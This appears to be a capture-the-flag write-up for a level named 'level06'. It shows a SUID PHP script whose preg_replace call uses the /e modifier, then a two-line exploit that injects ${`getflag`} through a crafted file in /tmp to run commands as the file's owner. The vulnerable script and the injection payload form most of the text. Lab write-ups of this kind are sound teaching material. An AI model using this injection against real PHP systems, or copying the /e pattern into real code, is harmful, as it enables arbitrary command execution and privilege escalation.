Level 06 have *SUID* bit
`-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06`

```php
#!/usr/bin/php

function y($m) { 
    $m = preg_replace("/\./", " x ", $m); 
    $m = preg_replace("/@/", " y", $m); 
    return $m; 
}
function x($y, $z) { 
    $a = file_get_contents($y); 
    # Eval le contenue de [x...]
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
    $a = preg_replace("/\[/", "(", $a); 
    $a = preg_replace("/\]/", ")", $a); 
    return $a; 
}
$r = x($argv[1], $argv[2]); 
print $r;
```

Following this documentation: https://wiki.php.net/rfc/remove_preg_replace_eval_modifier 
The modifier eval is vulnerable to arbitrary code execution by passing the string 
```
${`command`}
```

The PHP code can be exploited with:
```bash
echo '[x ${`getflag`}]' > /tmp/t
./level06 /tmp/t
```




